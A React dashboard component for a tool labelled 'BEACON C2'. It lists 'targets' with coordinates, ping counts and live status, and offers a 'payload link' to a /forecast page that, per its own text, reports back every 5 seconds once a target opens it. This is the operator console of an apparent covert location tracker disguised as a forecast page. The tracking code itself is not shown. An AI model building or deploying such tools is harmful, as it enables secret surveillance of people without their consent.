"use client";

import {
  useCallback,
  useEffect,
  useLayoutEffect,
  useMemo,
  useRef,
  useState,
} from "react";
import Link from "next/link";
import { useRouter } from "next/navigation";
import gsap from "gsap";
import { cn, formatNumber, shortId, timeAgo } from "@/lib/utils";

type Target = {
  id: string;
  lat: number;
  lng: number;
  signals: number;
  firstSeen: string;
  lastSeen: string;
  online: boolean;
};

type Stats = {
  total: number;
  live: number;
  signals: number;
};

const POLL_MS = 4000;
const OFFLINE_AFTER_MS = 15_000;

function RadarIcon({ className }: { className?: string }) {
  return (
    <svg
      width="22"
      height="22"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="1.6"
      strokeLinecap="round"
      className={className}
      aria-hidden="true"
    >
      <circle cx="12" cy="12" r="9" opacity="0.5" />
      <circle cx="12" cy="12" r="4.5" opacity="0.75" />
      <circle cx="12" cy="12" r="1.4" fill="currentColor" stroke="none" />
      <path d="M12 12 L19 6" />
      <path d="M12 3 a9 9 0 0 1 9 9" opacity="0.4" />
    </svg>
  );
}

export function DashboardView() {
  const router = useRouter();
  const [targets, setTargets] = useState<Target[]>([]);
  const [stats, setStats] = useState<Stats>({ total: 0, live: 0, signals: 0 });
  const [error, setError] = useState<string | null>(null);
  const [copied, setCopied] = useState(false);
  const [now, setNow] = useState(() => Date.now());

  const listRef = useRef<HTMLDivElement>(null);
  const headerRef = useRef<HTMLElement>(null);
  const statsRef = useRef<HTMLDivElement>(null);
  const prevIds = useRef<Set<string>>(new Set());

  const shareUrl = useMemo(
    () =>
      `${typeof window !== "undefined" ? window.location.origin : ""}/forecast`,
    [],
  );

  const poll = useCallback(async () => {
    try {
      const res = await fetch("/api/targets", { cache: "no-store" });
      if (!res.ok) {
        if (res.status === 401) {
          router.push("/login");
          return;
        }
        throw new Error(`request failed: ${res.status}`);
      }
      const json = (await res.json()) as { targets: Target[]; stats: Stats };
      setTargets(json.targets);
      setStats(json.stats);
      setError(null);
    } catch {
      setError("LINK LOST TO BACKEND — RETRYING");
    }
  }, [router]);

  useEffect(() => {
    const run = () => void poll();
    const initial = setTimeout(run, 0);
    const id = setInterval(run, POLL_MS);
    return () => {
      clearTimeout(initial);
      clearInterval(id);
    };
  }, [poll]);

  // Repaint the "x ago" labels every couple of seconds.
  useEffect(() => {
    const id = setInterval(() => setNow(Date.now()), 2000);
    return () => clearInterval(id);
  }, []);

  // Entrance animation.
  useLayoutEffect(() => {
    const ctx = gsap.context(() => {
      gsap.from(".dash-head", {
        opacity: 0,
        y: -16,
        duration: 0.5,
        ease: "power3.out",
      });
      gsap.from("[data-stat] .stat-num", {
        opacity: 0,
        y: 14,
        stagger: 0.08,
        duration: 0.4,
        delay: 0.15,
        ease: "power3.out",
      });
      gsap.from(".share-panel", { opacity: 0, y: 12, duration: 0.45, delay: 0.35 });
    }, listRef);
    return () => ctx.revert();
  }, []);

  // Count-up stat numbers when stats change.
  useEffect(() => {
    const nums = statsRef.current?.querySelectorAll<HTMLElement>("[data-target]");
    nums?.forEach((el, i) => {
      const target = Number(el.dataset["target"] ?? "0");
      gsap.fromTo(
        el,
        { innerText: Number(el.textContent ?? "0") },
        {
          innerText: target,
          duration: 0.8,
          ease: "power2.out",
          delay: i * 0.06,
          snap: { innerText: 1 },
        },
      );
    });
  }, [stats]);

  // Pop new cards in as devices appear.
  useEffect(() => {
    const current = new Set(targets.map((t) => t.id));
    const fresh = [...current].filter((id) => !prevIds.current.has(id));
    prevIds.current = current;
    if (fresh.length === 0) return;

    const ctx = gsap.context(() => {
      gsap.from(
        `[data-card="${fresh.join('"], [data-card="')}"]`,
        {
          opacity: 0,
          y: 16,
          scale: 0.95,
          stagger: 0.06,
          duration: 0.35,
          ease: "back.out(1.6)",
        },
      );
    }, listRef);
    return () => ctx.revert();
  }, [targets]);

  async function copyLink() {
    try {
      await navigator.clipboard.writeText(shareUrl);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch {
      setCopied(false);
    }
  }

  async function logout() {
    await fetch("/api/auth/logout", { method: "POST" });
    router.push("/login");
    router.refresh();
  }

  return (
    <main className="mx-auto w-full max-w-6xl px-5 pb-20 pt-6 sm:px-8">
      {/* ── header ── */}
      <header
        ref={headerRef}
        className="dash-head flex flex-wrap items-center justify-between gap-4"
      >
        <div className="flex items-center gap-3">
          <div className="flex h-11 w-11 items-center justify-center rounded-sm border border-[rgba(0,255,65,0.4)] bg-black/70 text-[#00ff41] shadow-[0_0_16px_rgba(0,255,65,0.25)]">
            <RadarIcon className="h-6 w-6" />
          </div>
          <div>
            <h1
              className="glitch font-bold tracking-[0.2em] text-white"
              data-text="BEACON C2"
            >
              BEACON C2
            </h1>
            <p className="font-mono text-xs text-[#2fbf71]">
              root@beacon:~$ cd /command_center
            </p>
          </div>
        </div>

        <div className="flex flex-wrap items-center gap-3 font-mono">
          <span className="term hidden items-center gap-2 rounded-sm px-3 py-2 text-xs text-[#00ff41] sm:flex">
            <span className="pulse-dot h-2 w-2 rounded-full" />
            [ FEED: {POLL_MS / 1000}s ]
          </span>
          <button
            onClick={copyLink}
            className="rounded-sm border border-[rgba(0,255,65,0.3)] bg-black/60 px-3 py-2 text-xs font-bold tracking-widest text-[#00ff41] transition hover:border-[#00ff41] hover:shadow-[0_0_14px_rgba(0,255,65,0.35)]"
          >
            [ {copied ? "LINK COPIED ✓" : "COPY PAYLOAD"} ]
          </button>
          <button
            onClick={logout}
            className="rounded-sm border border-red-500/40 bg-black/60 px-3 py-2 text-xs font-bold tracking-widest text-red-400 transition hover:border-red-400 hover:text-red-300"
          >
            [ LOGOUT ]
          </button>
        </div>
      </header>

      {/* ── system readout ── */}
      <section ref={statsRef} className="mt-8 grid gap-3 sm:grid-cols-3">
        {[
          { label: "TARGETS REGISTERED", value: stats.total },
          { label: "SIGNALS LIVE", value: stats.live },
          { label: "PINGS RECEIVED", value: stats.signals },
        ].map((s, i) => (
          <div key={s.label} data-stat={i} className="term-card rounded-sm p-5">
            <div className="text-xs tracking-widest text-[#2fbf71]">
              {s.label}
            </div>
            <div
              className="stat-num mt-1 font-bold text-[#00ff41]"
              data-target={s.value}
            >
              {s.value.toLocaleString()}
            </div>
            <div className="mt-1 text-[10px] text-[#1f9e4d]">
              ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
            </div>
          </div>
        ))}
      </section>

      {/* ── payload link ── */}
      <section className="share-panel term mt-6 rounded-sm p-4">
        <div className="text-xs tracking-widest text-[#2fbf71]">
          &gt; payload_link — target opens /forecast, feeds back every 5s
        </div>
        <div className="mt-2 flex flex-wrap items-center gap-3">
          <code className="min-w-0 flex-1 truncate text-sm text-[#00ff41]">
            {shareUrl}
          </code>
          <button
            onClick={copyLink}
            className="rounded-sm border border-[rgba(0,255,65,0.35)] bg-black/60 px-4 py-1.5 text-xs font-bold tracking-widest text-[#00ff41] transition hover:bg-[#00ff41] hover:text-black"
          >
            [ {copied ? "COPIED ✓" : "COPY"} ]
          </button>
        </div>
      </section>

      {/* ── devices ── */}
      <section className="mt-8">
        <div className="mb-4 flex items-center justify-between">
          <h2
            className="glitch font-bold tracking-[0.2em] text-white"
            data-text="## ACTIVE SIGNALS"
          >
            ## ACTIVE SIGNALS
          </h2>
          <span className="term rounded-sm px-3 py-1 text-xs font-bold text-[#00ff41]">
            {targets.length} TRACKED
          </span>
        </div>

        {error && (
          <div className="mb-4 rounded-sm border border-amber-500/50 bg-amber-500/10 px-4 py-2.5 font-mono text-xs font-bold tracking-wide text-amber-400">
            [!] {error}
          </div>
        )}

        <div ref={listRef}>
          {targets.length === 0 && !error ? (
            <div className="term rounded-sm border-dashed p-10 text-center">
              <p className="font-mono text-sm text-[#00ff41]">
                [ NO SIGNALS DETECTED ]
              </p>
              <p className="mt-2 font-mono text-xs text-[#2fbf71]">
                waiting for payload hit
                <span className="caret" aria-hidden="true" />
              </p>
              <button
                onClick={copyLink}
                className="mt-5 rounded-sm border border-[#00ff41] bg-black/60 px-4 py-2 text-xs font-bold tracking-widest text-[#00ff41] transition hover:bg-[#00ff41] hover:text-black"
              >
                [ {copied ? "LINK COPIED ✓" : "COPY PAYLOAD LINK"} ]
              </button>
            </div>
          ) : (
            <div className="grid gap-3 sm:grid-cols-2 lg:grid-cols-3">
              {targets.map((t) => {
                const last = new Date(t.lastSeen).getTime();
                const isLive = now - last < OFFLINE_AFTER_MS && t.online;
                return (
                  <Link
                    key={t.id}
                    href={`/map/${encodeURIComponent(t.id)}`}
                    data-card={t.id}
                    className={cn(
                      "term-card group relative overflow-hidden rounded-sm p-4",
                      !isLive && "opacity-75",
                    )}
                  >
                    <div className="flex items-start justify-between gap-2">
                      <div className="min-w-0">
                        <div className="truncate font-mono text-sm font-bold text-current">
                          [{shortId(t.id)}]
                        </div>
                        <div className="mt-0.5 text-[11px] opacity-60">
                          {t.lat.toFixed(4)}, {t.lng.toFixed(4)}
                        </div>
                      </div>
                      <span className="shrink-0 font-mono text-[11px] font-bold">
                        <span
                          className={cn(
                            "inline-block h-1.5 w-1.5 rounded-full align-middle",
                            isLive ? "pulse-dot" : "bg-[#1f9e4d]",
                          )}
                        />
                        <span className="ml-1.5">
                          {isLive ? "LIVE" : "STALE"}
                        </span>
                      </span>
                    </div>
                    <div className="mt-3 flex items-center justify-between text-[11px] opacity-70">
                      <span>pings: {formatNumber(t.signals)}</span>
                      <span>last: {timeAgo(last, now)}</span>
                    </div>
                    <div className="mt-2 border-t border-[rgba(51,255,119,0.14)] pt-2 text-[11px] font-bold tracking-widest opacity-60 transition group-hover:opacity-100">
                      &gt; OPEN LIVE MAP
                      <span className="caret" aria-hidden="true" />
                    </div>
                  </Link>
                );
              })}
            </div>
          )}
        </div>
      </section>

      <footer className="mt-14 text-center font-mono text-[11px] text-[#1f9e4d]">
        beacon://v2.0 · secure channel active · feed {POLL_MS / 1000}s
        <span className="mx-1 hidden sm:inline">·</span>
        <br className="sm:hidden" />
        © 2026 · developed by{" "}
        <a
          href="https://github.com/syed-mujtaba-stack/"
          target="_blank"
          rel="noopener noreferrer"
          className="font-bold text-[#00ff41] underline-offset-4 transition hover:underline"
        >
          Syed Mujtaba Abbas
        </a>
      </footer>
    </main>
  );
}